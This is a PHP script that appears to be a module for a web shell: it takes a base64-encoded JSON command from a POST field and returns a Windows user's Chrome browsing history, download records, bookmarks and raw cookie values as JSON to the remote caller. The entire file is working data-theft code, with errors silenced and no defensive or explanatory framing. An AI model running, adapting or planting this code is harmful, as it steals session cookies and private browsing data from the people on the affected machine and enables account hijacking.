<?php

@error_reporting(0);
header('Content-Type: text/plain; charset=utf-8');

$GLOBALS['chrome_base'] = '';
$GLOBALS['profile_dir'] = 'Default';

function dump_history() {
    $history_file = $GLOBALS['chrome_dir'] . DIRECTORY_SEPARATOR . 'History';
    if (!file_exists($history_file))
        return [];

    $dst = sys_get_temp_dir() . DIRECTORY_SEPARATOR . uniqid();
    if (!copy($history_file, $dst))
        return [];

    $results = [];
    try {
        $pdo = new PDO("sqlite:" . $dst);
        $stmt = $pdo->query("SELECT url, title, last_visit_time FROM urls");

        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $results[] = [
                'URL' => $row['url'],
                'Title' => $row['title'] ?? '',
                'LastUsed' => $row['last_visit_time']
            ];
        }
    } catch (Exception $e) {
        // do something
    }

    if (file_exists($dst))
        @unlink($dst);

    return $results;
}

function dump_cookie() {
    $cookie_file = $GLOBALS['chrome_dir'] . DIRECTORY_SEPARATOR . 'Network' . DIRECTORY_SEPARATOR . 'Cookies';
    if (!file_exists($cookie_file)) {
        $cookie_file = $GLOBALS['chrome_dir'] . DIRECTORY_SEPARATOR . 'Cookies';
    }

    if (!file_exists($cookie_file))
        return [];

    $dst = sys_get_temp_dir() . DIRECTORY_SEPARATOR . uniqid();
    if (!copy($cookie_file, $dst))
        return [];

    $results = [];

    try {
        $pdo = new PDO("sqlite:" . $dst);
        $stmt = $pdo->query("SELECT host_key, name, value FROM cookies");

        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $results[] = [
                'Host' => $row['host_key'],
                'Name' => $row['name'],
                'Value' => $row['value']
            ];
        }
    } catch (Exception $e) {
        // do something
    }

    if (file_exists($dst))
        @unlink($dst);

    return $results;
}

function dump_download() {
    $history_file = $GLOBALS['chrome_dir'] . DIRECTORY_SEPARATOR . 'History';
    if (!file_exists($history_file))
        return [];

    $dst = sys_get_temp_dir() . DIRECTORY_SEPARATOR . uniqid();
    if (!copy($history_file, $dst))
        return [];

    $results = [];

    try {
        $pdo = new PDO("sqlite:" . $dst);
        $stmt = $pdo->query("SELECT target_path, tab_url, total_bytes, start_time FROM downloads");

        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $results[] = [
                'FileName' => $row['target_path'] ?? '',
                'TargetPath' => $row['target_path'] ?? '',
                'URL' => $row['tab_url'] ?? '',
                'Length' => (int)($row['total_bytes'] ?? 0),
                'Date' => $row['start_time'] ?? ''
            ];
        }
    } catch (Exception $e) {
        // do something
    }

    if (file_exists($dst))
        @unlink($dst);

    return $results;
}

function parse_bookmarks_node($node, &$results) {
    if (isset($node['type']) && $node['type'] === 'url') {
        $results[] = [
            'name' => $node['name'] ?? '',
            'url' => $node['url'] ?? ''
        ];
    }
    
    if (isset($node['children']) && is_array($node['children'])) {
        foreach ($node['children'] as $child) {
            parse_bookmarks_node($child, $results);
        }
    }
}

function dump_bookmark() {
    $bookmark_file = $GLOBALS['chrome_dir'] . DIRECTORY_SEPARATOR . 'Bookmarks';
    if (!file_exists($bookmark_file))
        return [];

    $results = [];
    try {
        $content = file_get_contents($bookmark_file);
        if ($content === false)
            return [];

        $json = json_decode($content, true);
        if (!$json || !isset($json['roots']))
            return [];

        foreach ($json['roots'] as $root_key => $root_node) {
            parse_bookmarks_node($root_node, $results);
        }
    } catch (Exception $e) {
        // do something
    }

    return $results;
}

function do_init() {
    $appdata = $_SERVER['LOCALAPPDATA'] ?? getenv('LOCALAPPDATA');
    if (empty($appdata)) {
        $appdata = (getenv('USERPROFILE') ? getenv('USERPROFILE') . '\\AppData\\Local' : '');
    }
    
    if (empty($appdata))
        return false;

    $GLOBALS['chrome_base'] = $appdata . '\\Google\\Chrome\\User Data';

    return is_dir($GLOBALS['chrome_base']);
}

function main() {
    // check extension
    if (!extension_loaded('pdo_sqlite'))
        return '[-] pdo_sqlite is unavailable.';

    // do initialization
    if (!do_init())
        return '[-] Initialization failed: ' . $GLOBALS['chrome_base'];

    $config = json_decode(base64_decode($_POST['z1']), true);
    if (!$config)
        return '[-] Invalid JSON / Base64.';

    // parameters
    $action = $config['action'] ?? '';
    $profile = $config['profile'] ?? 'Default';

    $GLOBALS['profile_dir'] = $profile;
    $GLOBALS['chrome_dir'] = $GLOBALS['chrome_base'] . DIRECTORY_SEPARATOR . $profile;

    $response = [
        'status' => 'success',
        'action' => $action,
        'data' => []
    ];

    // router
    switch ($action) {
        case 'history':
            $response['data'] = dump_history();
            break;
        case 'cookie':
            $response['data'] = dump_cookie();
            break;
        case 'download':
            $response['data'] = dump_download();
            break;
        case 'bookmark':
            $response['data'] = dump_bookmark();
            break;
        default:
            return '[-] Unknown action: ' . $action;
    }

    return json_encode($response, JSON_UNESCAPED_UNICODE);
}

echo(main());

?>